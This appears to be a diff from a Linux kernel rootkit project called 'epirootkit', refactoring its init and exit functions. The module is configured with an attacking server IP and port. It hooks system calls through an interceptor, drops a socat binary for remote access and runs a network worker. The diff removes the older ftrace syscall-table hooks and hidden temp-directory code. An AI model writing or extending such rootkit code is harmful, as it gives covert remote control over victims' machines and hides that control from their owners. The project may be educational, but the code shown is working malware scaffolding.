@@ -4,8 +4,8 @@
 #include <linux/module.h>
 #include <linux/uaccess.h>
 
+#include "init.h"
 #include "epirootkit.h"
-#include "ftrace.h"
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -28,17 +28,9 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
 static int __init epirootkit_init(void) {
     DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
 
-    // Initalize hooks for the syscall table
-    int err;
-    err = fh_install_hooks(hooks, hook_array_size);
-    if (err) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to install hooks\n");
-        return err;
-    }
-
-    if (create_hidden_tmp_dir() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to create hidden tmp dir\n");
-        return -ENOMEM;
+    if (init_interceptor() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to init interceptor\n");
+        return -FAILURE;
     }
 
     if (drop_socat_binaire() != SUCCESS) {
@@ -70,15 +62,9 @@ static void __exit epirootkit_exit(void) {
         ERR_MSG("epirootkit: epirootkit_exit: failed to stop network worker\n");
     }
 
-    // Remove the hidden directory
-    if (remove_hidden_tmp_dir() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
-    }
-
     close_worker_socket();
 
-    // Remove hooks from the syscall table
-    fh_remove_hooks(hooks, hook_array_size);
+    exit_interceptor();
 
     DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
